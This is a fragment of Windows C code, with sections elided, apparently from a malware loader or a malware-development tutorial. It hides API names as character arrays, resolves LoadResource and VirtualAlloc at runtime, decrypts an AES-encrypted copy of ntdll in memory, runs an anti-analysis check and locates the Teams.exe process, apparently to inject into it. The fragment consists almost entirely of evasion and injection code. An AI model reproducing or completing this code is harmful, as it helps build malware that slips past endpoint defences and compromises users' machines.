...
unsigned char sLoadResource[] = {'L', 'o', 'a', 'd', 'R', 'e', 's', 'o', 'u', 'r', 'c', 'e', 0x0 };
...
int main(void) {
	...
	//ntdll
	unsigned char enc_ntdll = {[...snip...]}
	unsigned char ntdll_key[] = { 0xd4, 0x32, 0xc0, 0x2c, 0xa2, 0x37, 0x56, 0x55, 0xf4, 0xc3, 0x39, 0x4f, 0xcd, 0x21, 0xe, 0xde };
	unsigned int ntdll_key_len = sizeof(ntdll_key);
	
	size_t raw_ntdll_len = sizeof(enc_ntdll);    
	...
	if (checkMe() == 0){
		...
		LoadResource_t LoadResource_p = (LoadResource_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sLoadResource);
		VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAlloc);
		
		//move enc ntdll to memory
		auto raw_ntdll = VirtualAlloc_p(0, raw_ntdll_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		RtlMoveMemory_p(raw_ntdll, enc_ntdll, raw_ntdll_len);
		
		//decrypt ntdll
		AESDecrypt((char *) raw_ntdll, raw_ntdll_len, (char *) ntdll_key, ntdll_key_len);
		...
		pid = FindTarget("Teams.exe");

		if (pid) {
			printf("Teams.exe PID = %d\n", pid);
